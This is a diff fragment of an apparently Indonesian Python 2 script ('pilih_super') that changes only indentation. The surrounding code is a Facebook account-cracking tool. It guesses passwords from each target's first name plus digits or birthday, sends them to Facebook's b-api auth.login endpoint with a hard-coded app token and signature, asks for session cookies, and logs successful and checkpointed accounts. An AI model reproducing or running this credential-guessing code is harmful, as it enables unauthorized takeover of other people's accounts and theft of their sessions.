@@ -505,7 +505,7 @@ def pilih_super():
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)
                                                                                                                          else: 
-											                                                                                     pass10 = b['first_name'] + '0123456789'												
+											                                           pass10 = b['first_name'] + '0123456789'												
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -703,7 +703,7 @@ def pilih_super():
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass18)
                                                                                                                          else:
-                                                                                                           pass19 = b['first_name'] + b['birthday']											
+                                                                                                                                   pass19 = b['first_name'] + b['birthday']											
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass19)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
